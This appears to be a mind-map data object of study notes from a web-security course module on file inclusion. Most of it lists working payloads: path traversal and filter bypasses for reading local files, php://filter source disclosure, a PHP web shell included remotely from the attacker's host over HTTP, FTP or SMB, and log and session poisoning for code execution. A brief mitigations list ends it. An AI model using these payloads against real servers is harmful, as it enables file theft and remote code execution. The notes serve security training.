    const data = {"content":"File Inclusion","children":[{"content":"&#x1f3af; Main Idea","children":[{"content":"File Inclusion flaws occur when user input controls which file a web app loads (e.g. <code>?language=<\/code>), without proper sanitization.","children":[],"payload":{"tag":"li","lines":"2,3"}},{"content":"Goal: read sensitive local files (LFI), disclose source code, and escalate to remote code execution via RFI, PHP wrappers, and log poisoning.","children":[],"payload":{"tag":"li","lines":"3,4"}},{"content":"(Note: this module has no <code>00 - Cheatsheet.md<\/code>; payloads below are extracted from the lesson files.)","children":[],"payload":{"tag":"li","lines":"4,6"}}],"payload":{"tag":"h2","lines":"1,2"}},{"content":"&#x1f4a5; Attack / Exploit Vectors","children":[{"content":"Local File Inclusion (LFI) &amp; Path Traversal","children":[{"content":"Include local files via relative/absolute paths; traverse out of the web root.","children":[],"payload":{"tag":"li","lines":"8,9"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>/index.php?page=../../../../etc/passwd<\/code> &#x2014; read a Linux local file via path traversal","children":[],"payload":{"tag":"li","lines":"10,11"}},{"content":"<code>../../../../windows/boot.ini<\/code> / <code>C:\\Windows\\boot.ini<\/code> &#x2014; Windows equivalent","children":[],"payload":{"tag":"li","lines":"11,12"}},{"content":"<code>?language=/etc/passwd<\/code> &#x2014; absolute path inclusion","children":[],"payload":{"tag":"li","lines":"12,13"}},{"content":"Second-order: inject traversal into stored data (e.g. <code>/profile/&#x24;username/avatar.png<\/code>) so it&apos;s included elsewhere","children":[],"payload":{"tag":"li","lines":"13,14"}}],"payload":{"tag":"li","lines":"9,14"}}],"payload":{"tag":"h3","lines":"7,8"}},{"content":"Basic Bypasses (filters / appended extension)","children":[{"content":"Defeat naive filters, non-recursive stripping, approved-path checks, and appended <code>.php<\/code>.","children":[],"payload":{"tag":"li","lines":"15,16"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>....//....//etc/passwd<\/code> &#x2014; bypass non-recursive <code>../<\/code> removal (becomes <code>../<\/code> after one strip)","children":[],"payload":{"tag":"li","lines":"17,18"}},{"content":"<code>%2e%2e%2f<\/code> &#x2014; URL-encoded <code>../<\/code> to bypass filters (double-encode if needed)","children":[],"payload":{"tag":"li","lines":"18,19"}},{"content":"<code>./languages/../../../../etc/passwd<\/code> &#x2014; start with an approved path to pass validation","children":[],"payload":{"tag":"li","lines":"19,20"}},{"content":"<code>/etc/passwd%00<\/code> &#x2014; null-byte to drop appended extension (PHP &lt; 5.3/5.4 only)","children":[],"payload":{"tag":"li","lines":"20,21"}},{"content":"<code>/etc/passwd/.<\/code> &#x2014; trailing <code>/.<\/code> to bypass appended <code>.php<\/code> in some configs","children":[],"payload":{"tag":"li","lines":"21,22"}}],"payload":{"tag":"li","lines":"16,22"}}],"payload":{"tag":"h3","lines":"14,15"}},{"content":"PHP Filters &#x2014; Source Code Disclosure","children":[{"content":"Use <code>php://filter<\/code> with base64 to read PHP source instead of executing it.","children":[],"payload":{"tag":"li","lines":"23,24"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>php://filter/read=convert.base64-encode/resource=config<\/code> &#x2014; base64-encode and disclose <code>config.php<\/code> source","children":[],"payload":{"tag":"li","lines":"25,26"}},{"content":"<code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php<\/code> &#x2014; fuzz for PHP pages to read","children":[],"payload":{"tag":"li","lines":"26,27"}},{"content":"<code>echo &apos;PD9waHAK...&apos; | base64 -d<\/code> &#x2014; decode the disclosed source","children":[],"payload":{"tag":"li","lines":"27,28"}}],"payload":{"tag":"li","lines":"24,28"}}],"payload":{"tag":"h3","lines":"22,23"}},{"content":"Remote File Inclusion (RFI) &#x2014; RCE","children":[{"content":"Include a remote URL hosting a malicious PHP shell (requires <code>allow_url_include<\/code>).","children":[],"payload":{"tag":"li","lines":"29,30"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>?language=http://127.0.0.1:80/index.php<\/code> &#x2014; verify RFI by first including a local URL (also SSRF)","children":[],"payload":{"tag":"li","lines":"31,32"}},{"content":"<code>echo &apos;&lt;?php system(&#x24;_GET[&quot;cmd&quot;]); ?&gt;&apos; &gt; shell.php<\/code> &#x2014; create a malicious web shell","children":[],"payload":{"tag":"li","lines":"32,33"}},{"content":"<code>sudo python3 -m http.server &lt;LISTENING_PORT&gt;<\/code> &#x2014; host the shell over HTTP","children":[],"payload":{"tag":"li","lines":"33,34"}},{"content":"<code>?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id<\/code> &#x2014; include remote shell and run a command","children":[],"payload":{"tag":"li","lines":"34,35"}},{"content":"<code>sudo python -m pyftpdlib -p 21<\/code> + <code>?language=ftp://&lt;OUR_IP&gt;/shell.php&amp;cmd=id<\/code> &#x2014; host/include via FTP","children":[],"payload":{"tag":"li","lines":"35,36"}},{"content":"<code>impacket-smbserver -smb2support share &#x24;(pwd)<\/code> + <code>?language=\\\\&lt;OUR_IP&gt;\\share\\shell.php&amp;cmd=whoami<\/code> &#x2014; SMB (Windows, no <code>allow_url_include<\/code> needed)","children":[],"payload":{"tag":"li","lines":"36,37"}}],"payload":{"tag":"li","lines":"30,37"}}],"payload":{"tag":"h3","lines":"28,29"}},{"content":"Log Poisoning &#x2014; RCE","children":[{"content":"Write PHP code into a controllable, readable log/session file, then include it to execute.","children":[],"payload":{"tag":"li","lines":"38,39"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>?language=/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;<\/code> &#x2014; include a PHP session file (PHP Session Poisoning)","children":[],"payload":{"tag":"li","lines":"40,41"}},{"content":"<code>?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E<\/code> &#x2014; poison the session via <code>page<\/code> value, then include <code>&amp;cmd=id<\/code>","children":[],"payload":{"tag":"li","lines":"41,42"}},{"content":"<code>?language=/var/log/apache2/access.log<\/code> &#x2014; include the Apache access log","children":[],"payload":{"tag":"li","lines":"42,43"}},{"content":"<code>echo -n &quot;User-Agent: &lt;?php system(\\&#x24;_GET[&apos;cmd&apos;]); ?&gt;&quot; &gt; Poison<\/code> + <code>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -H @Poison<\/code> &#x2014; poison log via User-Agent header","children":[],"payload":{"tag":"li","lines":"43,44"}},{"content":"<code>/proc/self/environ<\/code>, <code>/proc/self/fd/N<\/code> &#x2014; alternative poisonable files if logs unreadable","children":[],"payload":{"tag":"li","lines":"44,45"}},{"content":"Other logs: <code>/var/log/sshd.log<\/code>, <code>/var/log/mail<\/code>, <code>/var/log/vsftpd.log<\/code>","children":[],"payload":{"tag":"li","lines":"45,46"}}],"payload":{"tag":"li","lines":"39,46"}}],"payload":{"tag":"h3","lines":"37,38"}},{"content":"Automated Scanning / Fuzzing","children":[{"content":"Fuzz for vulnerable parameters, LFI payloads, webroot, logs, and config files.","children":[],"payload":{"tag":"li","lines":"47,48"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>ffuf -w .../burp-parameter-names.txt:FUZZ -u &apos;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&apos; -fs 2287<\/code> &#x2014; fuzz for exposed parameters","children":[],"payload":{"tag":"li","lines":"49,50"}},{"content":"<code>ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &apos;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&apos; -fs 2287<\/code> &#x2014; fuzz LFI payloads","children":[],"payload":{"tag":"li","lines":"50,51"}},{"content":"<code>ffuf -w .../default-web-root-directory-linux.txt:FUZZ -u &apos;...?language=../../../../FUZZ/index.php&apos; -fs 2287<\/code> &#x2014; find server webroot","children":[],"payload":{"tag":"li","lines":"51,52"}},{"content":"<code>ffuf -w ./LFI-WordList-Linux:FUZZ -u &apos;...?language=../../../../FUZZ&apos; -fs 2287<\/code> &#x2014; fuzz for logs/config files","children":[],"payload":{"tag":"li","lines":"52,54"}}],"payload":{"tag":"li","lines":"48,54"}}],"payload":{"tag":"h3","lines":"46,47"}}],"payload":{"tag":"h2","lines":"6,7"}},{"content":"&#x1f6e0;&#xfe0f; Key Tools &amp; Concepts","children":[{"content":"Vulnerable functions &#x2014; <code>include()<\/code>/<code>include_once()<\/code>, <code>require()<\/code>, <code>file_get_contents()<\/code>, <code>fopen()<\/code>, <code>readfile()<\/code> (PHP); <code>import<\/code> (Java); <code>@Html.Partial()<\/code>/<code>RemotePartial()<\/code>, <code>include<\/code> (.NET); <code>res.render()<\/code>, <code>fs.readFile()<\/code> (NodeJS)","children":[],"payload":{"tag":"li","lines":"55,56"}},{"content":"Read vs Execute &#x2014; some functions only read a file&apos;s content, others execute included PHP","children":[],"payload":{"tag":"li","lines":"56,57"}},{"content":"<code>php://filter<\/code> wrapper &#x2014; stream filters (base64) for source disclosure","children":[],"payload":{"tag":"li","lines":"57,58"}},{"content":"<code>allow_url_include<\/code> &#x2014; PHP setting that must be On for RFI over http/ftp","children":[],"payload":{"tag":"li","lines":"58,59"}},{"content":"ffuf / seclists &#x2014; fuzzing tool and LFI wordlists (LFI-Jhaddix.txt)","children":[],"payload":{"tag":"li","lines":"59,60"}},{"content":"LFI tools &#x2014; LFISuite, LFiFreak, liffy (mostly outdated, python2)","children":[],"payload":{"tag":"li","lines":"60,62"}}],"payload":{"tag":"h2","lines":"54,55"}},{"content":"&#x1f6e1;&#xfe0f; Mitigations","children":[{"content":"Avoid passing user input to file-inclusion functions; use a whitelist/allow-list of permitted files","children":[],"payload":{"tag":"li","lines":"63,64"}},{"content":"Prevent directory traversal (strip/validate <code>../<\/code>, use <code>basename()<\/code>, verify final resolved path)","children":[],"payload":{"tag":"li","lines":"64,65"}},{"content":"Harden web server config: disable <code>allow_url_include<\/code>/<code>allow_url_fopen<\/code>, restrict file permissions","children":[],"payload":{"tag":"li","lines":"65,66"}},{"content":"Deploy a Web Application Firewall (WAF) as defense in depth","children":[],"payload":{"tag":"li","lines":"66,67"}}],"payload":{"tag":"h2","lines":"62,63"}}],"payload":{"tag":"h1","lines":"0,1"}}
